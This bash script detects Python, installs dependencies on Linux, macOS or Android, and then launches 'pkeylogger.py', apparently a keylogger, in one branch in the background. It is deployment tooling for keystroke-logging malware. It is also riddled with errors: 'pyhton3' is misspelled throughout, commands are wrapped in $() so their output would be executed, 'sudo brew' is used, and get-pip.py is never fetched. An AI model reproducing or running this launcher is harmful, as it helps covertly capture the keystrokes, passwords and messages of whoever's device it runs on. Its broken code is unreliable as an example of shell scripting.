#!/bin/bash

checkIfPythonIsInstalled () {
    WPY=$(which python)

    if [[ "$WPY" != *"python"* ]]; then

        echo "[x] Python not installed"
        sleep 5
        echo
        echo "[!] Installing Python"
        
        if [[ "$OSTYPE" == "linux-gnu"* ]]; then
            echo "[!] Linux system detected"
            $(sudo apt install pyhton3 wget)
            $(pyhton3 get-pip.py)
            $(pyhton3 -m pip install -r requirements.txt)
            $(python3 pkeylogger.py)
        
        elif [[ "$OSTYPE" == "darwin"* ]]; then
            echo "[!] OSX system detected"
            $(sudo brew install pyhton3 wget)
            $(pyhton3 get-pip.py)
            $(pyhton3 -m pip install -r requirements.txt)
            $(python3 pkeylogger.py)

        elif [[ "$OSTYPE" == "linux-android"* ]]; then
            echo "[!] Android system detected"
            $(pkg install pyhton wget)
            $(pyhton get-pip.py)
            $(pyhton -m pip install -r requirements.txt)
            $(python pkeylogger.py)
        
        elif [[ "$OSTYPE" == "cygwin" ]]; then
            echo "[!] POSIX compatibility layer and Linux environment emulation for Windows"
        
        elif [[ "$OSTYPE" == "msys" ]]; then
            echo "[!] Lightweight shell and GNU utilities compiled for Windows (part of MinGW)"
        else
            echo "[x] Oops out of scope"
        fi

    else
        echo "[+] Pyhton installed"
        $(python pkeylogger.py &)
    fi
    }



checkIfPythonIsInstalled